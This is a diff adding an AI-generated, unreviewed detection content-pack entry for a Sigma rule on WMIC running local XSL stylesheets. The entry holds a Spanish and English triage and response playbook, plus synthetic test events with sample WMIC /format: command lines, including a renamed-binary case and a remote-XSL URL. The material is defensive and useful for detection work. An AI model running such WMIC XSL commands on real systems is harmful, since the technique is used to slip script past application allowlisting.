@@ -1,0 +1,132 @@
+{
+  "rule": {
+    "id": "05c36dd6-79d6-4a9a-97da-3db20298ab2d",
+    "title": "XSL Script Execution Via WMIC.EXE",
+    "level": "medium",
+    "status": "test",
+    "author": "Timur Zinniatullin, oscd.community, Swachchhanda Shrawan Poudel",
+    "path": "windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1047",
+      "T1059.005",
+      "T1059.007",
+      "T1220"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó WMIC con un argumento /format: que no corresponde a un formato integrado ni a una URL o ruta UNC remota. Lo más probable es que haya cargado una hoja de estilo XSL local, que puede contener JScript o VBScript que WMIC ejecuta.",
+      "what_it_detects": "Eventos de creación de procesos donde la imagen es wmic.exe (identificada por Image, OriginalFileName o valores IMPHASH conocidos) y CommandLine contiene -format: o /format: (con cualquier variante de guion). Se excluyen los formatos integrados (list, table, htable, hform, mof, value, rawxml, xml, csv) y las rutas remotas (:// o UNC); una regla relacionada cubre las rutas remotas.",
+      "why_it_matters": "XSL Script Processing (T1220) usa WMIC (T1047) para ejecutar código incrustado en una hoja de estilo (JScript T1059.007 o VBScript T1059.005). Como un binario firmado por Microsoft ejecuta el script, el atacante puede eludir el application allowlisting y evadir las defensas.",
+      "triage_steps": [
+        "Revise CommandLine y extraiga la ruta del XSL indicada después de /format:. Anote la carpeta. Las rutas con permiso de escritura del usuario, como Temp, Downloads, Public o ProgramData, son sospechosas.",
+        "Compare Image y OriginalFileName. Si OriginalFileName es wmic.exe pero la ruta o el nombre de Image es distinto, el binario fue renombrado. Considérelo un indicador fuerte de actividad maliciosa.",
+        "Revise ParentImage y la línea de comandos del proceso padre. Son sospechosos padres como Office, intérpretes de scripts, mshta, navegadores o binarios desconocidos. Las herramientas administrativas programadas suelen ser benignas.",
+        "Obtenga el archivo XSL del endpoint, o su hash, y verifique si ya se había visto. Busque bloques msxsl:script, ActiveXObject, WScript.Shell o llamadas a Run.",
+        "Revise el mismo host en una ventana de +/- 15 minutos: procesos hijos de wmic.exe, creación del archivo XSL, conexiones de red y nueva persistencia.",
+        "Pivotee por usuario: confirme si suele usar WMIC y busque alertas previas sobre el mismo usuario o host, incluidas las reglas relacionadas de WMIC con XSL remoto."
+      ],
+      "false_positives": [
+        "Scripts administrativos o de inventario que usan hojas XSL locales personalizadas para dar formato de reporte a la salida de WMIC.",
+        "Herramientas heredadas de monitoreo o despliegue que incluyen sus propias plantillas .xsl para la salida de WMIC.",
+        "Administradores que prueban argumentos de formato estáticos, o nombres de formato que esta regla no excluye."
+      ],
+      "response_steps": [
+        "Confirme la actividad con el responsable del activo o con el usuario. Si el script es legítimo y está documentado, ajuste una exclusión para esa ruta y ese proceso padre en concreto.",
+        "Si es malicioso o no tiene explicación, aísle el endpoint y conserve una copia del archivo XSL y de los artefactos generados.",
+        "Finalice los procesos hijos maliciosos y luego elimine el XSL y la persistencia, pero solo después de haberlos recolectado.",
+        "Busque en toda la flota el mismo hash, ruta o patrón de línea de comandos del XSL. Restablezca las credenciales del usuario afectado si fueron comprometidas."
+      ],
+      "severity_rationale": "El nivel medium es adecuado porque usar un XSL local personalizado es poco común y es una técnica conocida de evasión, pero algunos scripts administrativos legítimos también lo hacen, así que el analista debe verificar antes de escalar."
+    },
+    "en": {
+      "summary": "WMIC was run with a /format: argument that is not a built-in output format and not a remote URL or UNC path. It most likely loaded a local XSL stylesheet, which can contain JScript or VBScript that WMIC executes.",
+      "what_it_detects": "Process creation events where the image is wmic.exe (matched by Image, OriginalFileName or known IMPHASH values) and CommandLine contains -format: or /format: (any dash variant). Built-in formats (list, table, htable, hform, mof, value, rawxml, xml, csv) and remote paths (:// or UNC) are excluded; a related rule covers remote paths.",
+      "why_it_matters": "XSL Script Processing (T1220) uses WMIC (T1047) to run script embedded in a stylesheet (JScript T1059.007 or VBScript T1059.005). Because a signed Microsoft binary runs the script, attackers can get around application allowlisting and evade defenses.",
+      "triage_steps": [
+        "Read CommandLine and pull out the XSL path given after /format:. Note the folder. User-writable paths such as Temp, Downloads, Public or ProgramData are suspicious.",
+        "Check Image and OriginalFileName. If OriginalFileName is wmic.exe but the Image path or name is different, the binary was renamed. Treat that as a strong malicious indicator.",
+        "Review ParentImage and the parent command line. Office apps, script hosts, mshta, browsers or unknown binaries as parent are suspicious. Scheduled admin tooling is usually benign.",
+        "Get the XSL file from the endpoint, or hash it and check whether it was seen before. Look for msxsl:script blocks, ActiveXObject, WScript.Shell or Run calls.",
+        "Look at the host within +/- 15 minutes: child processes of wmic.exe, file creation of the XSL, network connections, and new persistence.",
+        "Pivot on the user: check whether they normally run WMIC and look for earlier alerts on this user or host, including the related remote-XSL WMIC rules."
+      ],
+      "false_positives": [
+        "Admin or inventory scripts that use custom local XSL stylesheets to format WMIC output into reports.",
+        "Legacy monitoring or deployment tools that ship their own .xsl templates for WMIC output.",
+        "Admins testing static format arguments, or format names this rule does not exclude."
+      ],
+      "response_steps": [
+        "Confirm the activity with the asset owner or the user. If the script is legitimate and documented, tune an exclusion for that specific path and parent.",
+        "If it is malicious or unexplained, isolate the endpoint and keep a copy of the XSL file and any dropped artifacts.",
+        "Kill the malicious child processes, then remove the XSL file and any persistence, but only after you have collected them.",
+        "Search the fleet for the same XSL hash, path or command line pattern. Reset the credentials of the affected user if it was compromised."
+      ],
+      "severity_rationale": "Medium fits because custom local XSL use is rare and is a known defense-evasion technique, but some legitimate admin scripts also use it, so analysts need to verify before escalating."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "WMIC launched from Word loads a local XSL from the Public folder",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+          "OriginalFileName": "wmic.exe",
+          "CommandLine": "wmic.exe process list /format:\"C:\\Users\\Public\\report.xsl\"",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "CurrentDirectory": "C:\\Users\\jperez\\Documents\\"
+        }
+      },
+      {
+        "description": "Renamed WMIC binary identified via OriginalFileName using uppercase -FORMAT with a ProgramData XSL",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "Image": "C:\\ProgramData\\cache\\svchelper.exe",
+          "OriginalFileName": "wmic.exe",
+          "CommandLine": "svchelper.exe os get -FORMAT:\"C:\\ProgramData\\cache\\tpl.xsl\"",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Administrator exporting process list with the built-in CSV format (excluded by filter)",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\admin.soporte",
+          "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+          "OriginalFileName": "wmic.exe",
+          "CommandLine": "wmic process get name,processid /format:csv",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      {
+        "description": "WMIC with a remote XSL URL, excluded here because the related remote-XSL rule covers it",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0311.andes.example.com",
+          "User": "ANDES\\lgomez",
+          "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+          "OriginalFileName": "wmic.exe",
+          "CommandLine": "wmic os get /format:\"https://example.com/style.xsl\"",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
